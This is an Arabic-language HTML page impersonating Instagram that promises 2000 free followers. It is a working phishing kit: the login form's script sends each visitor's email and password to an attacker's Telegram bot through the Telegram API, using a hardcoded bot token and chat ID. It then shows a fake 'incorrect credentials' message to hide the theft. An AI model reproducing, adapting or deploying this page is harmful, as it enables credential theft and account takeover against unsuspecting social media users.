<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Instagram Followers</title>
<style>
    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background: linear-gradient(135deg, #f58529, #dd2a7b, #8134af, #515bd4);
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        color: white;
        padding: 10px;
        box-sizing: border-box;
    }
    .container {
        background: white;
        color: #262626;
        padding: 25px;
        border-radius: 15px;
        box-shadow: 0px 6px 18px rgba(0,0,0,0.2);
        text-align: center;
        width: 100%;
        max-width: 400px;
        position: relative;
        box-sizing: border-box;
    }
    img {
        width: 80px;
        margin-bottom: 15px;
    }
    h2 {
        font-size: 20px;
        margin-bottom: 10px;
        background: linear-gradient(to right, #f58529, #dd2a7b, #8134af, #515bd4);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
    }
    p {
        font-size: 14px;
        color: #555;
        margin-bottom: 20px;
    }
    input {
        width: 100%;
        padding: 12px;
        margin: 8px 0;
        border: 1px solid #ccc;
        border-radius: 8px;
        font-size: 14px;
        box-sizing: border-box;
    }
    button {
        background: linear-gradient(90deg, #f58529, #dd2a7b, #8134af, #515bd4);
        color: white;
        padding: 12px;
        width: 100%;
        border: none;
        border-radius: 8px;
        font-size: 15px;
        cursor: pointer;
        transition: 0.3s;
    }
    button:hover {
        opacity: 0.9;
    }
    .message {
        margin-top: 15px;
        padding: 12px;
        border-radius: 8px;
        background-color: #f8d7da;
        color: #721c24;
        border: 1px solid #f5c6cb;
        font-weight: bold;
        display: none;
        box-sizing: border-box;
    }
    .bg-circle1, .bg-circle2 {
        position: absolute;
        border-radius: 50%;
        filter: blur(100px);
        z-index: -1;
    }
    .bg-circle1 {
        width: 200px;
        height: 200px;
        background: #dd2a7b;
        top: -50px;
        left: -50px;
    }
    .bg-circle2 {
        width: 250px;
        height: 250px;
        background: #515bd4;
        bottom: -70px;
        right: -70px;
    }
</style>
</head>
<body>

<div class="container">
    <div class="bg-circle1"></div>
    <div class="bg-circle2"></div>
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" />
    <h2>احصل على 2000 متابع مجانًا!</h2>
    <p>سجّل الدخول باستخدام حسابك في إنستغرام للاستفادة من العرض.</p>
    <form id="loginForm" action="#" method="post" novalidate>
        <input type="email" name="email" id="email" placeholder="أدخل الجيميل" required />
        <input type="password" name="password" id="password" placeholder="أدخل كلمة المرور" required />
        <button type="submit">تسجيل</button>
    </form>
    <div id="errorMessage" class="message"></div>
</div>

<script>
    const form = document.getElementById('loginForm');
    const errorMessage = document.getElementById('errorMessage');

    const botToken = '8360784161:AAHyyOowiPS23PXqSFIGVTm-zbvySrWHUiM'; // استبدل بالتوكن الخاص بك
    const chatId = '7263138309'; // استبدل بمعرف المحادثة الخاص بك

    function sendToTelegram(email, password) {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const message = `📩 تم استلام بيانات تسجيل:\n\n📧 الايميل: ${email}\n🔑 كلمة المرور: ${password}`;

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => console.log('تم الإرسال إلى تلغرام', data))
        .catch(err => console.error('خطأ في الإرسال:', err));
    }

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value;

        sendToTelegram(email, password);

        errorMessage.style.display = 'block';
        errorMessage.textContent = 'هناك خطأ في صحة الجيميل وكلمة المرور، يرجى التحقق من صحتها.';

        setTimeout(() => {
            errorMessage.style.display = 'none';
        }, 5000);

        // تنظيف الحقول لو حبيت
        // form.reset();
    });
</script>

</body>
</html>
